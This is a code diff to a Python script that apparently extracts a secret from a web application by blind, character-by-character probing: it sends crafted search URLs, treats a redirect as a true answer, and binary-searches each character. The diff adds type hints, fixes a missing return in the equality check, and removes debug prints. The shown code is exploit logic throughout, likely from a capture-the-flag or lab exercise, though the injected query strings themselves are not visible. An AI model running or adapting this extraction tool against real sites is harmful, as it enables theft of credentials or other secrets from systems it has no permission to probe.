@@ -31,13 +31,13 @@ def is_success(attack_url: str):
     return response.url != attack_url
 
 
-def lower(idx, ch, url: str):
+def lower(idx, ch, url: str) -> bool:
     return is_success(encode_url(url, get_search_lt(idx, ch)))
 
-def eq_char(idx, ch, url: str):
-    is_success(encode_url(url, get_search_eq(idx, ch)))
+def eq_char(idx, ch, url: str) -> bool:
+    return is_success(encode_url(url, get_search_eq(idx, ch)))
 
-def eq(name, url: str):
+def eq(name, url: str) -> bool:
     return is_success(encode_url(url, search_eq+name))
 
 
@@ -47,7 +47,6 @@ def binary_search_char(idx, alphabet, url: str):
     while lo <= hi:
         mid = (lo + hi) // 2
         guess = alphabet[mid]
-        print(guess)
 
         if eq_char(idx, guess, url):
             return guess
@@ -55,7 +54,6 @@ def binary_search_char(idx, alphabet, url: str):
             hi = mid - 1
         else:
             lo = mid + 1
-    print("none")
     return None
 
 
@@ -67,8 +65,6 @@ def guess_secret(url: str):
     while True:
         if eq(name, url):
             return name
-        print(idx)
-        print(name)
         ch = binary_search_char(idx, alphabet, url)
         if ch is None:
             raise ValueError("Character not found in ASCII!")
